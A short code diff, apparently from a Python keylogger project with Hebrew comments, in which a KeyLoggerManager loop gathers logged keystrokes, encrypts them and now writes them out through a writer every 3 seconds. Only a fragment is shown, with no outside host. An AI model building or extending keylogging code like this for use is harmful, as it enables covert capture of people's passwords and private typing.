@@ -28,8 +28,9 @@ class KeyLoggerManager:
             data = self.keylogger_service.get_logged_keys()
             buffer = self.data_to_buffer(data)
             encrypt_buffer = self.encrypt.encryptor(buffer)
-            # self.write(encrypt_buffer)  # כתיבה מיידית
-            time.sleep(3600)  # מחכה 5 שניות לפני איסוף הנתונים הבא
+            self.writer.Write(encrypt_buffer.decode('utf-8'))
+
+            time.sleep(3)  # מחכה 5 שניות לפני איסוף הנתונים הבא
 
     def write(self, encrypt_buffer):
         """כתיבת הנתונים המוצפנים למחסן הנתונים"""
